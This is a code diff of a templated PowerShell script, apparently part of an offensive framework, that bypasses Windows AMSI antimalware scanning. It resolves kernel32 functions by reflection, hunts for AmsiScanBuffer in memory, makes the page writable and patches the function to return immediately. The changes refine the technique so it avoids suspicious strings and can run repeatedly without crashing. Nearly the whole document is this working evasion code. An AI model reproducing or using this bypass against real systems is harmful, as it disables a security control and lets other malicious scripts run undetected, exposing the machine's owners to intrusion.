@@ -1,33 +1,68 @@
-# AMSI Patch
-# Modified By: Shantanu Khandelwal (@shantanukhande)
-# Original Author: Paul Laîné (@am0nsec)
+# AMSI bypass via inline patching
 #
+# This code will bypass AMSI by patching the assembly instructions of amsi!AmsiScanBuffer. This technique has been
+# refined to:
+#     1. Find the address of amsi!AmsiScanBuffer in memory without invoking kernel32!GetProcAddress with an obviously
+#        malicious string.
+#     2. Utilize VirtualQuery to ensure the scanning does not go past the boundary of the page, ensuring it can be run
+#        multiple times without crashing.
+#
+# Original Author: Paul Laîné (@am0nsec)
+# Modified By:
+#   Shantanu Khandelwal (@shantanukhande)
+#   Spencer McIntyre (@zeroSteiner)
+# See:
+#     * https://www.contextis.com/en/blog/amsi-bypass
+#     * https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909
+#     * https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass
 
 Class %{cls_Hunter} {
     static [IntPtr] %{mth_FindAddress}([IntPtr]$%{var_address}, [byte[]]$%{var_egg}) {
-        while ($true) {
-            [int]$%{var_count} = 0;
+        $%{var_meminfo} = New-Object byte[](48);
+        $%{var_VirtualQueryAddr} = %{func_get_proc_address} kernel32.dll VirtualQuery;
+        $%{var_VirtualQueryDelegate} = %{func_get_delegate_type} @([IntPtr], [Byte[]], [Int]) ([Int]);
+        $%{var_VirtualQuery} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_VirtualQueryAddr}, $%{var_VirtualQueryDelegate});
 
-            while ($true) {
-                [IntPtr]$%{var_address} = [IntPtr]::Add($%{var_address}, 1);
-                If ([System.Runtime.InteropServices.Marshal]::ReadByte($%{var_address}) -eq $%{var_egg}.Get($%{var_count})) {
-                    $%{var_count}++;
-                    If ($%{var_count} -eq $%{var_egg}.Length) {
-                        return [IntPtr]::Subtract($%{var_address}, $%{var_egg}.Length - 1);
-                    }
-                } Else { break }
-            }
+        $%{var_VirtualQuery}.Invoke($%{var_address}, $%{var_meminfo}, $%{var_meminfo}.Length);
+
+        If ([IntPtr]::Size -eq 8) {
+            $%{var_address_cursor} = $%{var_address}.ToInt64();
+            $%{var_address_end} = [BitConverter]::ToInt64($%{var_meminfo}, 0) + [BitConverter]::ToInt64($%{var_meminfo}, 24);
+        }
+        Else {
+            $%{var_address_cursor} = $%{var_address}.ToInt32();
+            $%{var_address_end} = [BitConverter]::ToInt32($%{var_meminfo}, 0) + [BitConverter]::ToInt32($%{var_meminfo}, 16);
         }
 
-        return $%{var_address};
+        while ($%{var_address_cursor} -lt $%{var_address_end}) {
+            [int]$%{var_count} = 0;
+
+            while ($%{var_address_cursor} -lt $%{var_address_end}) {
+                $%{var_address_cursor} += 1;
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]::New($%{var_address_cursor})) -eq $%{var_egg}.Get($%{var_count})) {
+                    $%{var_count}++;
+                    If ($%{var_count} -eq $%{var_egg}.Length) {
+                        return $%{var_address_cursor} - $%{var_egg}.Length - 1;
+                    }
+                }
+                Else {
+                    break;
+                }
+            }
+        }
+        return [IntPtr]::Zero;
     }
 }
+
+
 function %{func_get_proc_address} {
     Param ($%{var_module}, $%{var_procedure});
     $%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');
 
     return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($%{var_module})))), $%{var_procedure}));
 }
+
+
 function %{func_get_delegate_type} {
     Param (
         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%{var_parameters},
@@ -40,6 +75,8 @@ function %{func_get_delegate_type} {
 
     return $%{var_type_builder}.CreateType();
 }
+
+
 $%{var_LoadLibraryAddr} = %{func_get_proc_address} kernel32.dll LoadLibraryA;
 $%{var_LoadLibraryDelegate} = %{func_get_delegate_type} @([String]) ([IntPtr]);
 $%{var_LoadLibrary} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_LoadLibraryAddr}, $%{var_LoadLibraryDelegate});
@@ -47,7 +84,7 @@ $%{var_GetProcAddressAddr} = %{func_get_proc_address} kernel32.dll GetProcAddres
 $%{var_GetProcAddressDelegate} = %{func_get_delegate_type} @([IntPtr], [String]) ([IntPtr]);
 $%{var_GetProcAddress} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_GetProcAddressAddr}, $%{var_GetProcAddressDelegate});
 $%{var_VirtualProtectAddr} = %{func_get_proc_address} kernel32.dll VirtualProtect;
-$%{var_VirtualProtectDelegate} =  %{func_get_delegate_type} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
+$%{var_VirtualProtectDelegate} = %{func_get_delegate_type} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
 $%{var_VirtualProtect} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_VirtualProtectAddr}, $%{var_VirtualProtectDelegate});
 
 
@@ -95,18 +132,20 @@ $%{var_hModule} = $%{var_LoadLibrary}.Invoke("amsi.dll");
 $%{var_DllGetClassObjectAddress} = $%{var_GetProcAddress}.Invoke($%{var_hModule}, "DllGetClassObject");
 # Write-Host "[+] DllGetClassObject address: $%{var_DllGetClassObjectAddress}";
 [IntPtr]$%{var_targetedAddress} = [%{cls_Hunter}]::%{mth_FindAddress}($%{var_DllGetClassObjectAddress}, $%{var_egg});
-# Write-Host "[+] Targeted address: $%{var_targetedAddress}";
 
-$%{var_oldProtectionBuffer} = 0;
-$%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, 4, [ref]$%{var_oldProtectionBuffer}) | Out-Null;
+If ($%{var_targetedAddress} -ne [IntPtr]::Zero) {
+    # Write-Host "[+] Targeted address: $%{var_targetedAddress}";
+    $%{var_oldProtectionBuffer1} = 0;
+    $%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, 4, [ref]$%{var_oldProtectionBuffer1}) | Out-Null;
 
-$patch = [byte[]] (
-    # xor rax, rax
-    0x31, 0xC0,
-    # ret
-    0xC3
-);
-[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $%{var_targetedAddress}, 3);
+    $patch = [byte[]] (
+        # xor rax, rax
+        0x31, 0xC0,
+        # ret
+        0xC3
+    );
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $%{var_targetedAddress}, 3);
 
-$a = 0;
-$%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, $%{var_oldProtectionBuffer}, [ref]$a) | Out-Null;
+    $%{var_oldProtectionBuffer2} = 0;
+    $%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, $%{var_oldProtectionBuffer1}, [ref]$%{var_oldProtectionBuffer2}) | Out-Null;
+}
